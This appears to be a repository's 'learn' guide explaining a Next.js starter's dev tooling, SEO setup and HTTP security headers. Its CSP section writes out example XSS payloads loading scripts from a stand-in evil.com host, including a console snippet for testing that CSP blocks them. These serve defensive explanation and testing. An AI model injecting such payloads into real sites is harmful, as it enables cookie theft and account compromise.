# Learn: How This Template's Tooling Works

Plain-English explanations of the concepts behind this template's dev tooling. Written for future-you (or anyone new to the repo) to understand _why_ things are set up this way, not just _that_ they are.

## Git hooks (the basic idea)

Git can run a script automatically at certain points — before a commit, before a push, etc. These scripts live in `.git/hooks/` by default, but that folder isn't committed to your repo (it's local-only), so hooks normally can't be shared with teammates.

**Husky** solves this: it manages hook scripts inside a `.husky/` folder that _is_ committed to the repo, and points Git at that folder instead. This happens via the `"prepare": "husky"` script in `package.json`, which runs automatically every time someone runs `npm install` — so every contributor gets the same hooks with zero manual setup.

## lint-staged: why not just lint everything?

`.husky/pre-commit` runs `npx lint-staged`. Why not just run `eslint .` on the whole repo?

Because on a big project, linting/formatting everything on every commit is slow, and it would also flag pre-existing issues in files you didn't even touch. `lint-staged` instead:

1. Looks at only the files you've `git add`ed (staged).
2. Matches them against glob patterns in `.lintstagedrc.json`.
3. Runs the matching command(s) only on those files.
4. If a command modifies a file (`prettier --write`), it re-stages the fixed version automatically. `eslint` deliberately runs _without_ `--fix` here — it only reports, it never rewrites staged code — so a lint error means the commit is blocked until you fix it yourself, not that ESLint quietly changed what you're about to commit.
5. If anything fails, it reverts your working directory to how it was before, and blocks the commit — so a failed hook never leaves your files half-modified.

## Why both ESLint _and_ Prettier?

They solve different problems:

- **ESLint** = code _quality_ — catches actual bugs, bad patterns, accessibility issues (via `jsx-a11y`), unused variables, etc.
- **Prettier** = code _style_ — consistent quote style, spacing, line width. It doesn't care if your code is buggy, only if it's formatted consistently.

Without `eslint-config-prettier`, ESLint might have its own opinion about formatting (e.g. semicolons) that conflicts with Prettier's opinion, and they'd fight each other. `eslint-config-prettier` simply turns off ESLint's formatting-related rules, leaving Prettier as the single source of truth for style.

`prettier-plugin-tailwindcss` is a Prettier plugin (not ESLint) that specifically reorders Tailwind utility classes inside `className` strings into a canonical order, so diffs don't get noisy just because two people wrote the same classes in a different order.

## Pre-commit vs pre-push: why two different hooks?

- **pre-commit** needs to be _fast_ — it runs on every single commit, possibly several times an hour. It only checks staged files, and only does quick things (lint + format).
- **pre-push** runs less often (once per push), so it can afford to do something heavier: a full TypeScript check (`tsc --noEmit`) across the _entire_ project, and a full production build (`next build`). This catches things pre-commit structurally can't — e.g., a type error caused by a file you didn't stage in this commit but that got broken by one you did.

If you put the heavy checks in pre-commit instead, commits would feel slow and people would start using `git commit --no-verify` to skip it — which defeats the whole point.

## File permission bits, and why Windows makes this weird

Git tracks a very limited "is this file executable" flag per file, stored as part of the file's mode in Git's index — either `100644` (normal file) or `100755` (executable).

- On macOS/Linux, this bit is a real filesystem concept, and tools like `chmod +x` set it directly.
- On Windows (NTFS), there's no equivalent OS-level bit, so Git can't infer it from the filesystem the normal way.

This matters for `.husky/pre-push`, because it's a shell script — hook runners need to execute it, which typically requires the executable bit to be set for the check to reliably work across all environments (your Windows machine, a teammate's Mac, and GitHub's Linux CI runners).

**`git update-index --add --chmod=+x .husky/pre-push`** manually tells Git: "record this file's mode as executable in the index," independent of what the real filesystem says. `--add` stages the file if it wasn't already staged; `--chmod=+x` flips the recorded bit.

**`git ls-files -s .husky/pre-push`** lets you check the current recorded mode. Output looks like:

```
100755 <blob-hash> 0 .husky/pre-push
```

The leading number is the mode: `100755` = executable, `100644` = not executable. Use this any time you want to verify a permission change actually took.

## `.nvmrc` and `node-version-file`

`.nvmrc` is just a plain text file containing a Node.js version (e.g. `24.15.0` or `24`). It's a convention understood by Node version managers:

- Locally, if you use `nvm` (or `nvm-windows`, `fnm`, `volta`), running `nvm use` in the project folder reads this file and switches your shell to that Node version automatically.
- In CI, `actions/setup-node`'s `node-version-file: ".nvmrc"` option reads the same file, so local dev and CI always agree on the Node version without you having to update two places.

Common mistake: writing `node-version: ".nvmrc"` (wrong key) instead of `node-version-file: ".nvmrc"` (right key). The first tells the action to treat the literal string `".nvmrc"` _as if it were a version number_ — which fails, because no such Node version exists. The `-file` suffix is what tells it "read the version out of this file."

Pinning the **exact patch** (`24.15.0`) gives perfect reproducibility but means you manually bump it for every Node patch release. Floating the **major only** (`24`) auto-picks up patches/security fixes with less maintenance, at the cost of local/CI potentially being a patch version apart at any given moment (rarely causes real problems).

## What "CI" actually means

**CI = Continuous Integration**: the practice of automatically checking that new code "integrates" cleanly with the existing codebase — it builds, it lints clean, it typechecks — every time someone pushes or opens a pull request. It's distinct from **CD (Continuous Deployment)**, which is about automatically shipping code somewhere after CI passes. This template currently only has CI — nothing is auto-deployed.

The workflow at `.github/workflows/ci.yml`:

- Triggers on `pull_request` (any branch) and `push` to `main`.
- Runs on a fresh `ubuntu-latest` virtual machine — every time, from scratch, no leftover state from previous runs (aside from what you explicitly cache).
- Each `run:` step executes in sequence; the first one that exits non-zero stops the whole job and marks the check as failed.

Note that CI passing doesn't _block_ a merge unless you separately enable **branch protection** (GitHub repo Settings → Branches) requiring that check to pass — without that setting, a red CI check is just informational.

## `npm ci` vs `npm install`

`npm ci` (used in the CI workflow) is a stricter variant meant for automated environments:

- Installs _exactly_ what's pinned in `package-lock.json`.
- Fails immediately if `package.json` and `package-lock.json` are out of sync, instead of silently updating the lockfile.
- Deletes `node_modules` first for a guaranteed-clean install.

`npm install` is what you use locally when you're actively adding/changing dependencies, since it's allowed to update the lockfile.

## The extra strict `tsconfig` flags

`strict: true` turns on TypeScript's main safety net, but a few useful checks live outside it. Each one below catches a specific real bug pattern:

- **`noUncheckedIndexedAccess`** — `arr[i]` or `obj[key]` normally types as "the value" even though it might not exist at that index. This flag makes it type as "the value **or** `undefined`", forcing you to handle the missing case instead of crashing at runtime.
- **`noImplicitOverride`** — if a class method overrides a parent class method, you must write the `override` keyword. Stops you from accidentally overriding a method by typo, and flags it if the parent method gets renamed/removed later.
- **`noFallthroughCasesInSwitch`** — in a `switch`, if a `case` has code but no `break`/`return`, it silently "falls through" into the next case. This is almost always a forgotten `break`, so TypeScript now errors on it.
- **`noUnusedLocals`** — errors on variables you declared but never used. Usually dead code or a leftover from a refactor.
- **`noUnusedParameters`** — same idea, for function parameters you never use (prefix with `_` if it's genuinely unused-on-purpose, e.g. `(_req, res) => ...`).
- **`exactOptionalPropertyTypes`** — for an optional field like `{ name?: string }`, this stops you from explicitly assigning `name: undefined`. It draws a line between "the key is absent" and "the key is present but `undefined`" — two different things that are easy to conflate and cause subtle bugs with `JSON.stringify`, spreading, etc.
- **`forceConsistentCasingInFileNames`** — errors if you `import` a file using the wrong letter casing (e.g. `./Button` vs `./button`). macOS/Windows filesystems are case-insensitive so this works locally, but Linux (including most CI/production servers) is case-sensitive, so it silently breaks the build there. This catches it before it ships.

## How the SEO setup works, and how to override it

This template's SEO isn't a pile of hardcoded meta tags — it's a few small pieces that compose. Here's the model, top to bottom.

### Where the values come from

Everything traces back to 4 env vars, validated in `src/config/env.ts`, and wrapped in one object in `src/config/site.ts`:

```ts
export const siteConfig = {
  url: env.NEXT_PUBLIC_SITE_URL,
  name: env.NEXT_PUBLIC_SITE_NAME,
  description: env.NEXT_PUBLIC_SITE_DESCRIPTION,
  twitterHandle: env.NEXT_PUBLIC_TWITTER_HANDLE,
};
```

Every SEO file (`layout.tsx`, `robots.ts`, `sitemap.ts`, `opengraph-image.tsx`) imports `siteConfig` instead of hardcoding strings. Change SEO output by changing the env var, not the code — deploying to production just needs `NEXT_PUBLIC_SITE_URL=https://acme.com` set in that environment, and every URL, OG tag, sitemap entry, and JSON-LD block updates automatically.

### `metadataBase` — why it exists

```ts
metadataBase: new URL(siteConfig.url),
```

Metadata fields like `openGraph.url` or `alternates.canonical` need to be _absolute_ URLs (`https://acme.com/about`), but writing absolute URLs everywhere is annoying and error-prone. `metadataBase` lets you write relative paths (`url: "/"`, `url: "/about"`) and Next.js prefixes them with `metadataBase` automatically. Set once in the root layout, it applies to every route below it.

### Title template — how `%s` works

```ts
title: {
  default: siteConfig.name,              // used on the homepage (no override)
  template: `%s | ${siteConfig.name}`,
},
```

- A page with **no** `title` export shows `default` ("Starter Template").
- A page that exports `title: "About"` gets it substituted into `%s`, producing **"About | Starter Template"**.

This cascades: the title set in `app/layout.tsx` is the fallback; any nested `layout.tsx` or `page.tsx` can override it.

### Overriding metadata per page

Add a `metadata` export to any `page.tsx`/`layout.tsx` — it **merges** with the parent, but nested objects like `openGraph` replace the whole parent object rather than deep-merging, so restate what you want:

```tsx
// src/app/about/page.tsx
import type { Metadata } from "next";

export const metadata: Metadata = {
  title: "About", // -> "About | Starter Template"
  description: "Why we built this starter.",
  alternates: {
    canonical: "/about", // see the warning below — don't skip this
  },
  openGraph: {
    title: "About", // openGraph fully replaces the root's openGraph
    description: "Why we built this starter.",
    url: "/about", // resolved against metadataBase
  },
};

export default function AboutPage() {
  return <main>...</main>;
}
```

> **Don't skip `alternates.canonical`.** Unlike `openGraph`, which replaces the parent's object wholesale when you override it, `alternates` is a field you have to override explicitly per page too — if you don't, the page silently **inherits the root layout's `alternates: { canonical: "/" }`**, meaning every page without its own `canonical` claims the homepage as its canonical URL. This is exactly the kind of bug static checks can't catch (it's valid TypeScript, valid HTML, builds fine) but Lighthouse's SEO audit will flag as "Document does not have a valid `rel=canonical`" — found and fixed in `src/app/about/page.tsx` this way. Every new page needs its own `alternates: { canonical: "/your-path" }`.

For metadata that depends on fetched data (e.g. a blog post), use `generateMetadata` instead of a static export:

```tsx
// src/app/blog/[slug]/page.tsx
export async function generateMetadata({ params }: { params: Promise<{ slug: string }> }) {
  const { slug } = await params;
  const post = await getPost(slug);
  return {
    title: post.title,
    description: post.excerpt,
    openGraph: { title: post.title, images: [post.coverImage] },
  };
}
```

### `robots.ts` — controlling crawler access

The current file allows everything and points crawlers at the sitemap. To block a section or target specific bots:

```ts
export default function robots(): MetadataRoute.Robots {
  return {
    rules: [
      { userAgent: "*", allow: "/", disallow: "/admin/" },
      { userAgent: "GPTBot", disallow: "/" }, // block a specific crawler entirely
    ],
    sitemap: `${siteConfig.url}/sitemap.xml`,
  };
}
```

This regenerates `/robots.txt` at build time — visit it directly to see the output.

### `sitemap.ts` — listing your URLs

Right now it's a single entry (the homepage) because that's all this starter has. Once real routes exist, extend the array — including fetching dynamic entries (e.g. blog slugs from a DB):

```ts
export default async function sitemap(): Promise<MetadataRoute.Sitemap> {
  const posts = await getAllPosts();
  return [
    { url: siteConfig.url, lastModified: new Date(), priority: 1 },
    { url: `${siteConfig.url}/about`, lastModified: new Date(), priority: 0.8 },
    ...posts.map((p) => ({
      url: `${siteConfig.url}/blog/${p.slug}`,
      lastModified: p.updatedAt,
      changeFrequency: "weekly" as const,
      priority: 0.5,
    })),
  ];
}
```

### The OG/Twitter image — how it's generated, and how to override it per route

```tsx
// src/app/opengraph-image.tsx
export const size = { width: 1200, height: 630 };
export default function Image() {
  return new ImageResponse(<div style={{ ... }}>{siteConfig.name}</div>, { ...size });
}
```

This isn't a static file — it's a route handler. At build time, Next.js runs it, renders the JSX with `satori` (a React-to-image renderer), and outputs a real PNG at `/opengraph-image`. `twitter-image.tsx` re-exports the same function so both cards use the identical image without duplicating render logic.

To give a specific page its **own** OG image (e.g. a blog post with the post title baked in), drop a same-named file into that route's folder — the more specific one wins:

```tsx
// src/app/blog/[slug]/opengraph-image.tsx
export default async function Image({ params }: { params: Promise<{ slug: string }> }) {
  const { slug } = await params;
  const post = await getPost(slug);
  return new ImageResponse(<div style={{ fontSize: 64 }}>{post.title}</div>, {
    width: 1200,
    height: 630,
  });
}
```

Next.js auto-detects the file and injects the correct `og:image`/`twitter:image` meta tags for that route — no manual wiring needed.

### JSON-LD — structured data for rich search results

```tsx
<script
  type="application/ld+json"
  dangerouslySetInnerHTML={{
    __html: JSON.stringify({ "@context": "https://schema.org", "@type": "WebSite", name: siteConfig.name, ... }),
  }}
/>
```

This is plain HTML — Google reads this `<script>` tag to understand the site is a `WebSite` entity (this can power sitelinks search boxes in results). To add more structured data on a specific page (e.g. an `Article` schema on a blog post), drop another one of these scripts into that page's JSX with a different `@type`:

```tsx
// inside src/app/blog/[slug]/page.tsx
<script
  type="application/ld+json"
  dangerouslySetInnerHTML={{
    __html: JSON.stringify({
      "@context": "https://schema.org",
      "@type": "Article",
      headline: post.title,
      datePublished: post.publishedAt,
      author: { "@type": "Person", name: post.author },
    }),
  }}
/>
```

`dangerouslySetInnerHTML` is safe here specifically because the content is `JSON.stringify`'d structured data under your control — not raw user input.

### Quick mental model

| Layer                    | File                      | Scope                        | How to override                             |
| ------------------------ | ------------------------- | ---------------------------- | ------------------------------------------- |
| Site identity            | `.env.local`              | Global                       | Change env var                              |
| Meta tags / OG / Twitter | `layout.tsx` → `metadata` | Cascades to all routes       | Add `metadata` export in a page/layout      |
| Data-dependent meta tags | `generateMetadata()`      | Per route                    | Export it in that route's `page.tsx`        |
| Crawler rules            | `robots.ts`               | Site-wide                    | Edit the `rules` array                      |
| URL list for crawlers    | `sitemap.ts`              | Site-wide                    | Return more entries                         |
| Share-card image         | `opengraph-image.tsx`     | Cascades, most specific wins | Add same-named file in a route folder       |
| Rich search results      | JSON-LD `<script>`        | Wherever you place it        | Add another script with a different `@type` |

## TypeScript path aliases (`@/*`)

In `tsconfig.json`:

```json
"paths": {
  "@/*": ["./src/*"]
}
```

This lets you write `import { x } from "@/lib/x"` instead of `import { x } from "../../../lib/x"`. It's purely a TypeScript/bundler resolution rule — Next.js's bundler and `tsc` both understand it natively, no extra tooling required. It only affects how imports are _written_; it has no runtime cost.

## Security headers — what each one actually stops

`next.config.ts`'s `headers()` attaches 6 HTTP response headers to every route. These are invisible in the rendered page — you'd only see them in DevTools' Network tab or via `curl -I`. Each one is the browser being told "enforce this rule for pages from this site" — the browser does the actual blocking, the header is just an instruction.

### `Strict-Transport-Security` (HSTS)

```
max-age=63072000; includeSubDomains; preload
```

**Attack scenario:** a user types `yoursite.com` with no `https://`, or clicks an old `http://` link. That first request goes out over plain HTTP — on public WiFi or a compromised router, an attacker can intercept it before the redirect to HTTPS happens, and read or rewrite it.

Once a browser sees this header once, it remembers for `max-age` seconds (here, 2 years) to never attempt plain HTTP for this domain again, rewriting `http://` to `https://` internally before the request even goes out. `includeSubDomains` extends that to every subdomain. `preload` is a request to be added to browsers' hardcoded HSTS list so even the very first-ever visit is covered — actually landing on that list requires separately submitting to [hstspreload.org](https://hstspreload.org). Browsers exempt `localhost` from HSTS, so this never interferes with local dev.

### `X-Frame-Options: SAMEORIGIN`

**Attack scenario:** clickjacking. An attacker embeds your site in an invisible `<iframe>` on their own page, positions a fake button exactly over your site's real "Delete account" or "Confirm payment" button, and tricks a user into clicking through without realizing what they actually clicked.

This tells the browser "only allow this page to be framed by a page on the same origin as itself" — an attacker's page, on a different origin, gets a blocked/blank frame. The CSP directive `frame-ancestors 'self'` does the identical job and is the modern replacement; both are set here since it costs nothing and `X-Frame-Options` still has marginally broader legacy support.

### `X-Content-Type-Options: nosniff`

**Attack scenario:** a feature lets users upload a file, and someone uploads something named `photo.jpg` that's actually HTML/JS. If a browser "sniffs" the content and decides it's actually HTML — ignoring the `Content-Type` the server sent — it might execute it as a page instead of displaying it as an image, smuggling in an XSS payload.

This tells the browser to trust the server's `Content-Type` exactly as sent, never guess from content. Essentially free, standard practice.

### `Referrer-Policy: strict-origin-when-cross-origin`

**Attack scenario:** a user is on `yoursite.com/reset-password?token=abc123` and clicks a link to an external site. By default, browsers send the full previous URL — including that token — to the destination in the `Referer` header. That external site's access logs now contain your user's password-reset token.

This policy says: navigating to a **different origin**, send only the origin (`https://yoursite.com`), not the path/query string; navigating within **your own** site, still send the full URL (useful for your own analytics). Most browsers already default to this, but setting it explicitly means the app doesn't depend on that default staying true.

### `Permissions-Policy`

```
camera=(), microphone=(), geolocation=(), browsing-topics=(), interest-cohort=()
```

**Attack scenario:** if a third-party script ever gets injected into the page (a compromised npm package, a malicious ad), it could try calling `navigator.mediaDevices.getUserMedia()` to secretly access the camera/mic, or `navigator.geolocation` to track the user's location.

The empty `()` after each feature means "disabled for everyone, including same-origin" — enforced by the browser itself regardless of what JS runs. `browsing-topics`/`interest-cohort` specifically disable Google's FLoC/Topics ad-tracking API. If a feature genuinely needs one of these later (e.g. an avatar-photo capture using the camera), change that entry to `camera=(self)` to re-allow it for your own origin only.

### `Content-Security-Policy` (CSP) — a whitelist per resource type

Each `xxx-src` directive answers "for this category of resource, what origins are trusted to load from":

| Directive                   | Value                                   | Meaning                                                                                      |
| --------------------------- | --------------------------------------- | -------------------------------------------------------------------------------------------- |
| `default-src`               | `'self'`                                | Fallback for anything not listed below: nothing loads except from our own domain             |
| `script-src`                | `'self' 'unsafe-inline'`                | Run JS from our own domain, and allow inline `<script>` tags                                 |
| `style-src`                 | `'self' 'unsafe-inline'`                | Same, for CSS                                                                                |
| `img-src`                   | `'self' data: blob:`                    | Images from our domain, plus `data:`/`blob:` URIs (image previews, Next's blur placeholders) |
| `font-src`                  | `'self'`                                | Fonts only from our own domain                                                               |
| `connect-src`               | `'self'` + the exact Sentry ingest host | `fetch`/`XHR`/WebSocket targets                                                              |
| `object-src`                | `'none'`                                | No `<object>`/`<embed>`/plugin content, ever                                                 |
| `frame-ancestors`           | `'self'`                                | CSP's version of `X-Frame-Options`                                                           |
| `upgrade-insecure-requests` | —                                       | Auto-upgrade any accidental `http://` sub-resource reference to `https://`                   |

**Concrete attack it stops:** classic stored XSS. Say a form doesn't sanitize input and someone submits `<script src="https://evil.com/steal-cookies.js"></script>` into a field that gets rendered back. Without CSP, that script runs fully — reads cookies, local storage, keystrokes. With `script-src 'self'`, the browser refuses to even fetch a script from `evil.com` — a CSP violation shows up in the console instead, and the payload never executes.

**Why `'unsafe-inline'` is there, and what it costs:** ordinarily you'd want CSP _without_ `'unsafe-inline'`, because that's what stops an inline `<script>alert(1)</script>` payload too — with `'unsafe-inline'`, an attacker's inline script tag is allowed to run exactly the same as the app's own inline scripts, since CSP can't tell them apart without a nonce.

The strict version uses a unique per-request nonce — a random token only the server knows, stamped on both legitimate scripts and the CSP header, unguessable by an attacker. But a fresh nonce per request means the page can't be static: it must render dynamically per-request, via `proxy.ts` — this fork's renamed `middleware.ts` (see `node_modules/next/dist/docs/01-app/02-guides/content-security-policy.md` for the full nonce walkthrough; no `proxy.ts` exists in this template yet, since nothing currently needs it). The homepage currently builds as `○ Static` (rendered once, served from cache forever) — nonce-based CSP would force every route to `ƒ Dynamic`, a real performance/cost tradeoff, not free security.

So today's setup: external script _sources_ are still restricted to `'self'` (an injected `<script src="evil.com">` is blocked), but inline script _injection_ specifically is not stopped by CSP alone. That's a deliberate middle ground — meaningfully better than no CSP, not as strong as nonce-based CSP. If the app later renders genuinely unsanitized user content, upgrading to nonces via `proxy.ts` is the documented next step.

### How to actually verify any of this is working, not just present

1. **Headers exist:** `npm run build && npm run start`, then `curl -sI http://localhost:3000/` — look for all 6.
2. **CSP doesn't break the app:** open the site in a real browser with DevTools' Console open, click through every page/feature once — a CSP violation shows as a red `Refused to load ...` error.
3. **CSP actually blocks something** (proves it's not decorative): in the browser console, run
   ```js
   var s = document.createElement("script");
   s.src = "https://evil.com/x.js";
   document.head.appendChild(s);
   ```
   It should be refused, with a CSP violation logged and no request to `evil.com` in the Network tab.
4. **External sanity check** once deployed: paste the CSP header value into [Google's CSP Evaluator](https://csp-evaluator.withgoogle.com/) — it'll correctly flag `'unsafe-inline'`, which is the known, documented tradeoff above, not a surprise.
5. **Sentry still reaches out:** since `connect-src` is the exact ingest host (not a wildcard), run `npm run sentry:test` and check the browser Network tab for a request to that host when a client-side error fires.

None of this fixes bugs — it caps the blast radius of one. A future XSS bug in a contact form or comment feature still needs to be fixed at the source; these headers just mean that if one slips through anyway, its damage is contained.
